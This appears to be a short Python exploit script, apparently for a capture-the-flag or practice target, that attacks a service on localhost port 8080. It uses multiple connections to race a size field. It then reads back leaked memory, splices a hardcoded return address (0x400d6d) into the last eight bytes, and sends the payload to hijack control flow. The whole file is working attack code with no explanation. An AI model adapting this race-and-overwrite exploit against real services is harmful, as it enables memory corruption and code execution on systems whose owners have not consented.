
# Impot time to pause current thread so that we can start another instance
import time
import socket
import struct
# Function that converts any integer into a 8 bit format
integer_to_byte = lambda i: int.to_bytes(i, 8, 'little', signed=True)

# Creating the main thread and helper thread to listen on port 8080
main_thread     = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
helper_thread_1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

main_thread.connect(("localhost",8080))
helper_thread_1.connect(("localhost",8080))

#main_thread.send(struct.pack('<I',16))
main_thread.send(integer_to_byte(0x10))
main_thread.send(b'\x41'*8)


time.sleep(1)
helper_thread_1.send(integer_to_byte(0x60))
helper_thread_1.close()
main_thread.send(b'\x41'*8)


msg = main_thread.recv(0x60)

msg = msg[:-0x08] + integer_to_byte(0x0400d6d)

helper_thread_2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
helper_thread_2.connect(("localhost",8080))
main_thread.send(integer_to_byte(0x10))
helper_thread_2.send(integer_to_byte(0x60))
helper_thread_2.close()
main_thread.send(msg)
ret = main_thread.recv(0x60)
print(ret)
